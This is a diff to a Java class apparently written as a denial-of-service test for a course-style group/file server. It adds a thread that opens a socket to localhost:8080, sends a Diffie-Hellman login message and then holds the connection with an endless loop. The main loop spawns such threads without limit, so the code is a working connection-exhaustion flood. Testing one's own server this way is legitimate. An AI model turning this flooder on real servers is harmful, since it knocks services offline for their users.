@@ -20,6 +20,9 @@ import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.List;
 
+import java.net.Socket;
+import java.io.ObjectOutputStream;
+
 import javax.crypto.KeyAgreement;
 import javax.crypto.SealedObject;
 import javax.crypto.SecretKey;
@@ -32,6 +35,24 @@ public class Dos {
 	 static GroupClient groupC;
 	 static FileClient fileC;
 	 static KeyPair keyPair;
+
+	public static class LoginDoS implements Runnable{
+
+		public void run(){
+			try{
+				Socket sock = new Socket("localhost", 8080);
+				ObjectOutputStream out = new ObjectOutputStream(sock.getOutputStream());
+			
+				login(out);
+			} catch (Exception e){
+				e.printStackTrace();
+			}
+			
+			while(true){
+
+			}
+		}
+	}
 
 	public static void main(String[] args) throws Exception {
 		Security.addProvider(new BouncyCastleProvider());
@@ -46,15 +67,15 @@ public class Dos {
 		keyPair = RSA.loadRSA("dospublic.key", "dosprivate.key");
 		PublicKey serverPublicKey = RSA.loadServerKey("groupserverpublic.key");
 		while (true) {
-			groupC = new GroupClient();
-			fileC = new FileClient();
-			groupC.connect("localhost", 8080);
-			groupC.authenticateGroupServerRSA("test", "adminpublic.key", "adminprivate.key");
-			UserToken t = groupC.getToken("test", serverPublicKey);
+
+			(new Thread(new LoginDoS())).start();
+
+			//groupC.authenticateGroupServerRSA("test", "adminpublic.key", "adminprivate.key");
+			//UserToken t = groupC.getToken("test", serverPublicKey);
 		}
 	}
 
-	public static void login() throws Exception {
+	public static void login(ObjectOutputStream out) throws Exception {
 		KeyPair dhKeyPair = null;
 		KeyAgreement keyAgreement = null;
 		dhKeyPair = DiffieHellman.genKeyPair();
@@ -68,6 +89,6 @@ public class Dos {
 		message.addObject("test");
 		message.addObject(sealedKey);
 		message.addObject(dhKeyPair.getPublic());
-		groupC.output.writeObject(message);
+		out.writeObject(message);
 	}
 }
